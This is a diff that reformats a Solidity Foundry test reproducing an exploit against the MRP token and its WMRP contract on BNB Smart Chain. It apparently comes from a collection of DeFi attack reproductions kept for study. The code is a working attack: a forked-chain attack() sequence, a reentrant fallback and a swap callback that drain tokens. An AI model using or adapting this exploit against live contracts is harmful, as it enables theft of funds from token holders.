@@ -17,47 +17,44 @@ contract Exploit is Test {
     IERC20 MRP = IERC20(0xA0Ba9d82014B33137B195b5753F3BC8Bf15700a3);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 40122169);
+        cheats.createSelectFork("bsc", 40_122_169);
     }
 
     function testExploit() public {
         emit log_named_decimal_uint("[Begin] Attacker BNB before exploit", address(this).balance, 18);
         attack();
         emit log_named_decimal_uint("[End] Attacker BNB after exploit", address(this).balance, 18);
-
     }
 
     function attack() public {
         address(WMRP).call{value: 43.14 ether}("");
-        WMRP.transfer(address(WMRP),0);
-        MRP.transfer(address(WMRP),MRP.balanceOf(address(this)));
+        WMRP.transfer(address(WMRP), 0);
+        MRP.transfer(address(WMRP), MRP.balanceOf(address(this)));
         address(WMRP).call{value: 58 ether}("");
-        WMRP.transfer(address(this),0);
-        MRP.transfer(address(WMRP),1268 ether);
-        WMRP.transfer(address(WMRP),0);
-          emit log_named_decimal_uint(
-            "attacker MRP balance :", MRP.balanceOf(address(this)), MRP.decimals()
-        );
-        require(MRP.balanceOf(address(this)) >= 6000 ether,"The attack is invalid.");
-        uint256 Transferamount=MRP.balanceOf(address(this))/20;
-        uint256 i=0;
-        while(i<20){
-            MRP.transfer(address(MRP),Transferamount);
+        WMRP.transfer(address(this), 0);
+        MRP.transfer(address(WMRP), 1268 ether);
+        WMRP.transfer(address(WMRP), 0);
+        emit log_named_decimal_uint("attacker MRP balance :", MRP.balanceOf(address(this)), MRP.decimals());
+        require(MRP.balanceOf(address(this)) >= 6000 ether, "The attack is invalid.");
+        uint256 Transferamount = MRP.balanceOf(address(this)) / 20;
+        uint256 i = 0;
+        while (i < 20) {
+            MRP.transfer(address(MRP), Transferamount);
             i++;
         }
     }
-    fallback() external payable{
-        if(msg.value > 50 ether && msg.value < 100 ether){
+
+    fallback() external payable {
+        if (msg.value > 50 ether && msg.value < 100 ether) {
             address(WMRP).call{value: 58 ether}("");
         }
     }
 
-    function on314Swaper()public returns(bytes4){
+    function on314Swaper() public returns (bytes4) {
         bytes4 selector = bytes4(msg.data);
         if (selector == 0x1457b0ed) {
             return 0x0000000;
         }
         revert("no such function");
     }
-    
 }
